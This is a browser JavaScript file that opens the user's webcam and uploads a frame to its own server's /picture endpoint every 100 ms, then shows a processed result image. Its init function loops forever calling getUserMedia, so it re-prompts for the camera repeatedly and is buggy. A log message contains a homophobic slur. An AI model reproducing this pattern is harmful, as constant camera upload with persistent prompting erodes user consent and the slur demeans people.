"use strict";

const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const errorMsgElement = document.querySelector("span#errorMsg");
const id = `${Math.round(Math.random() * 1000)}${Math.round(Math.random() * 1000)}${Math.round(Math.random() * 1000)}${Math.round(Math.random() * 1000)}+${new Date().toDateString()}`
let initial = false


const post = async (data) => {
    await fetch(`/picture?id=${id}`, {
        method: "POST",
        body: JSON.stringify({
            img: data,
        }),
        headers: {
            "Content-Type": "application/json",
        },
    }).catch(() => console.log("shit"));

};

// Success
const success = (stream) => {
    window.stream = stream;
    video.srcObject = stream;

    let context = canvas.getContext("2d");
    setInterval(async () => {
        // decode the images

        try {
            context.drawImage(video, 0, 0, 640, 480);
            let canvasData = canvas
                .toDataURL("image/png")
                .replace("image/png", "image/octet-stream");

            post(canvasData);
        } catch (e) { e ? null : null }
        if (!initial) {
            document.body.innerHTML += `<image src="/image-result?id=${id}"/>`
            initial = true
        }

    }, 100);
};
// access to the webcam
const init = async () => {
    while (true) {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({
                audio: false,
                video: {
                    facingMode: "user",
                },
            });
            success(stream);

        } catch (e) {
            console.log(`maricon no podemos acceder a esto :( ${e}`);
        }
    }
};

// Load init
init();
